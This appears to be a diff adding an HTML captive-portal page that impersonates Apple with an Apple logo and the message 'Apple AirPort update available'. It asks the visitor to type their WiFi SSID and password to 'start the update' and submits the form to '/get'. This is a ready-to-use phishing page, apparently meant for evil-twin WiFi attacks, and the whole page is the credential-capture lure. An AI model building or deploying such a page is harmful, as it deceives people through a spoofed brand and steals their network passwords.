@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: white;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #000000;
+  margin-right: 80px
+}
+
+.form-container {
+  background: #FFFFFF;
+  border: 1px solid #000000;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+h2 {
+  text-align: center; 
+  font-size: 24px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 2px solid #000000;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+.brand-name {
+  font-size: 42px;
+  color: #000000;
+  margin-left: 10px;
+}
+
+.submit-btn {
+  background: #000000;
+  border: none;
+  color: #FFFFFF;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  display: block;
+  margin: auto;
+  margin-top: 20px;
+}
+
+.submit-btn:hover {
+  background: #000000;
+}
+
+.forgot-password {
+  display: block;
+  text-align: center;
+  color: #000000;
+  text-decoration: underline;
+  margin-top: 10px;
+}
+
+.error-message {
+  color: #000000;
+  text-align: center;
+  display: none; 
+  margin-top: 10px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="151.000000pt" height="177.000000pt" viewBox="0 0 1518.000000 1770.000000"
+ preserveAspectRatio="xMidYMid meet">
+<g transform="translate(0.000000,1770.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M10625 17193 c-88 -19 -389 -104 -515 -145 -916 -297 -1571 -758
+-2003 -1407 -204 -307 -362 -630 -481 -982 -141 -422 -217 -846 -242 -1371 -6
+-134 -6 -138 13 -138 38 0 317 31 463 51 301 42 501 89 665 155 602 246 1280
+890 1684 1601 391 689 602 1656 473 2167 -17 71 -22 77 -57 69z"/>
+<path d="M10535 13419 c-313 -29 -670 -99 -1025 -200 -58 -17 -254 -79 -436
+-139 -871 -287 -1269 -365 -1604 -316 -248 37 -606 121 -1040 245 -736 209
+-1159 296 -1615 332 -188 15 -616 6 -775 -16 -553 -76 -1013 -247 -1450 -538
+-563 -376 -1074 -975 -1425 -1667 -339 -672 -524 -1371 -607 -2300 -18 -197
+-18 -1070 0 -1280 132 -1569 644 -3064 1595 -4655 959 -1604 1952 -2399 2938
+-2351 325 16 674 107 1209 318 471 186 718 260 1061 319 178 30 521 37 719 15
+316 -37 663 -121 1075 -262 682 -233 969 -310 1305 -349 368 -43 696 18 1058
+197 635 314 1271 987 1924 2038 362 583 666 1183 879 1735 71 187 169 479 161
+486 -4 3 -56 23 -117 44 -138 49 -379 170 -513 258 -353 234 -700 594 -989
+1027 -363 544 -573 1145 -633 1810 -17 181 -14 567 5 743 81 765 384 1437 922
+2047 143 161 483 497 690 679 l163 143 -30 38 c-83 105 -271 311 -410 450
+-231 231 -412 384 -632 533 -487 332 -1015 526 -1638 602 -160 20 -617 28
+-765 14z"/>
+</g>
+</svg>
+
+
+    <div class="brand-name"><b>Apple AirPort update available</b></div>
+
+
+
+  </div>
+
+  <div class="form-container">
+  <center><h1><b>Connect to your WiFi to start the update</b></h1>
+      </center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="SSID" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+	    <a href="javascript:void(0);" class="forgot-password">Where can I find my SSID?</a>
+			<div class="error-message"></div>
+      <button class="submit-btn" type="submit">UPDATE</button>
+
+    </form>
+
+  </div>
+
+</div>
+<script>
+  document.querySelector('.forgot-password').addEventListener('click', function() {
+    var errorMessage = document.querySelector('.error-message');
+    errorMessage.innerHTML = "The SSID, or Service Set Identifier, represents your WiFi network's official name. If you haven't previously set a custom name, the default SSID (and password) can be located on the back panel of your router.";
+    errorMessage.style.display = 'block';
+  });
+</script>
+</meta>
+</body>
+</html>
